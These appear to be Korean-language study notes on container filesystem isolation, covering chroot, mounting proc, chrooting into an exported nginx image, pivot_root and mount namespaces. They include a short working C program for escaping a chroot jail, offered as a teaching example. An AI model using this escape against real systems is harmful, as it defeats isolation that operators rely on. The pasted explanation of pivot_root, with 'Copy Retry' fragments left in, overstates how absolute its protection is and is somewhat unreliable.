```bash

sudo -Es # change to root user

```

프로세스 비교

ps aux

네트워크 비교

ip l

uid gid 비교

# 컨테이너 파일시스템

최소 3가지 조건을 만족해야 한다.

## 프로세스 가두기

root 디렉토리로 속일 디렉토리

usage :

chroot [option] newroot [command]

ex) chroot myroot /bin/sh

ldd : list dynamic dependencies

아치 기준 경로 libc.so.6 경로 찾기

```bash

pacman -Qo /usr/lib/libc.so.6

/usr/lib/libc.so.6


```

```bash

mkdir -p myroot/{lib64,lib/x86_64-linux-gnu};

cp /lib/x86_64-linux-gnu/libc.so.6 myroot/lib/x86_64-linux-gnu/;

cp /lib64/ld-linux-x86-64.so.2 myroot/lib64;

```

### ls command 복사하기

### chroot

chroot는 유저 프로세스에서 루트를 속이는 것이다.
현재 프로세스의 루트 디렉토리를 대상 디렉토리로 변경한다.

- 패키징 : 경로에 의존성을 모으는것
- 격리 : 경로에 의존성을 가둬서 실행하는것

### mount

어떤 파일 시스템을 root에 부착하는 것

```bash

mount -t proc proc /tmp/myroot/proc

mount /tmp/myroot/proc

umount /tmp/myroot/proc

```

## nginx chroot 하기bash

```bash
mkdir nginx-root

docker export $(docker create nginx) | tar -C nginx-root -xvf -

chroot nginx-root /bin/sh


```

### 탈옥 예제

```c

#include<unistd.h>
#include<sys/stat.h>
int main(void)
{
mkdir(".out", 0755);
chroot(".out");
chdir("../../../../../");
chroot(".");
return execl("/bin/sh", "-i", NULL);
}

```

## 탈옥 방지하기

### pivot root의 개념

원래는 물리적인 장치 드라이버를 설치해서 올리는 부부트 파일시스템에서 다른 파일 시스템으로 루트를 전환하기 위한 기능

pivot_root 의 원래 용도는 OS 부팅과정에서 임시로 사용되는 부트 파일 시스템을 실제 커널이 동작할 루트 파일 시스템으로 교체하는것

### 네임스페이스

호스트에 영향을 주지 않고

- file system은 이름으로 관리되는 일종의 네임스페이스이다.

- 네임스페이스에는 다양한 종류가 있을 수 있다.
- mount는 루트 파일시스템에 서브파일시스템을 부착하는 시스템 콜
- mount point는 파일 시스템이 부착(mount) 될 위치를 의미한다.
- mount namesapce는 mount point를 격리한다.
- 마운트 네임스페이스가 mount point를 격리한다는 것은 파일시스템 마운트와 해제 등의 변경사항이 네임스페이스 밖에서는 보이지 않고 외부에 영향을 주지 않음을 의미한다.

### container에서의 pivot root

루트 파일시스템 피봇(pivot)의 핵심 개념 정리:

의미와 목적:

컨테이너가 보는 루트 디렉토리(/)를 완전히 새로운 위치로 변경하는 작업
호스트 시스템의 파일시스템으로부터 컨테이너를 완전히 격리하기 위한 기술
컨테이너 탈옥(container escape) 방지가 주요 목적
chroot와의 차이점:

chroot는 단순히 루트 디렉토리 위치만 변경하며 호스트 시스템 접근 가능성이 남아있음
pivot_root는 이전 루트를 완전히 언마운트하여 호스트 시스템과의 연결을 완벽하게 차단
보안적 관점에서 pivot_root가 더 안전한 격리 제공
동작 방식:

컨테이너용 새로운 루트 파일시스템을 지정
이전 루트 파일시스템을 특정 위치로 이동
이전 루트를 언마운트하여 호스트 시스템과의 연결 완전 제거
보안상 이점:

컨테이너 내부 프로세스의 호스트 파일시스템 접근 원천 차단
root 권한을 가진 프로세스도 호스트 시스템으로 탈출 불가능
컨테이너의 격리성 강화로 보안성 향상
이러한 이유로 도커(Docker)와 같은 현대적 컨테이너 기술은 pivot_root를 기본 격리 메커니즘으로 채택하고 있습니다.

Copy
Retry

## 중복 해결하기

오버레이 파일시스템

## Key Takeaway

컨테이너가 서버환경으로 부터 독립하기 위해서는 파일 시스템으로 부터의 독립이 필요합니다. 따라서, 컨테이너가 "전용 루트파일시스템"을 갖는 것은 의미가 있습니다. 컨테이너가 자체적으로 파일시스템을 갖게 됨으로써 어떤 서버에 올려도 호스트 파일시스템에 영향을 받지 않게 되며, 배포가 쉬워집니다.
